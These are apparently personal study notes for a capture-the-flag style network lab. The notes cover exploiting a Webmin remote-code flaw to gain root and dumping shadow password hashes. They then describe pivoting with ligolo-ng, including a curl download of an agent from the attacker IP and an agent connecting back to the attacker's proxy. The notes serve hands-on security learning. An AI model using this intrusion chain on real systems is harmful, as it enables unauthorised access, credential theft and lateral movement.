
KISS = Keep It Simple Stupid

LOTL = Living Off The Land


We know that .200 is Linux from (wappalyzer aka Centos) or whatweb etc......
See i am just mixing my OSINT website skills with enumeration to confirm that it's CentOS
![[Pasted image 20240806021754.png]]


```
ttps://thomaswreath.thm [200 OK] Apache[2.4.37], Bootstrap, Country[RESERVED][ZZ], Email[#,me@thomaswreath.thm], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1c], IP[10.200.87.200], JQuery[2.1.4], OpenSSL[1.1.1c], Script, Title[Thomas Wreath | Developer], X-UA-Compatible[IE=edge]
```

Where i got stuck was when i open the service running on port 1000 (i.e. snet-sensor-mgmt)
Got Webmin so i was searching CVE and RCE for it and not snet-sensor-mgmt.

So both are same in the end we some to troubleshoot according the info we get
![[Pasted image 20240806022048.png]]


https://github.com/MuirlandOracle/CVE-2019-15107?tab=readme-ov-file
got the cve implementation in python it was also available with Metasploit version as well.

Let's see the privilege and depending on that we will see what we can do
BINGOOOOOOOOOOOOOOOOOO root user
```
id
```

Keys / password is  the things that come to my mind.

```
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::

twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
```

```
cat ~/.ssh/id_rsa.pub
```


We got the access to the production sever through the ssh
![[Pasted image 20240806030713.png]]

What i would do is to run LPE usually when i get a low level user but it's already at root
So next thing that should come to my mind is there any other assets that we can access through .200 ??

for that we need nmap which is not possible on the asset so will simply transfer a precompiled binary of nmap to it.


```
./nmap-sar -sn 10.200.87.1-255
```

 `-sn` switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.

We got    .1     .100      .150       .200     .250  so from these we can minus   .1     .250     .200

So we have connection to .100 and .150 but i have scanned both and only .150 returned with open ports.


```
./nmap_sar -sS -p 1-15000 10.200.87.150
```
![[Pasted image 20240806201736.png]]

## Pivoting
So i decided to go this tool and will master it through practice. (i.e. upload the agent on the target device)
Download agent and proxy
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.4.3
```
tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```

```
curl 10.50.88.33/agent -o agent
```

![[Pasted image 20240807132007.png]]


Set the Interface in Kali 
```
sudo ip tuntap add user root mode tun ligolo
```

```
sudo ip link set ligolo up
```

```
sudo ip route add 10.200.87.0/24 dev ligolo
```

![[Pasted image 20240807133010.png]]


Attacker
```
./proxy -selfcert 
```
![[Pasted image 20240807134145.png]]


Compromised Asset
```
./agent -connect 10.5.88.33:11601 -ignore-cert
```

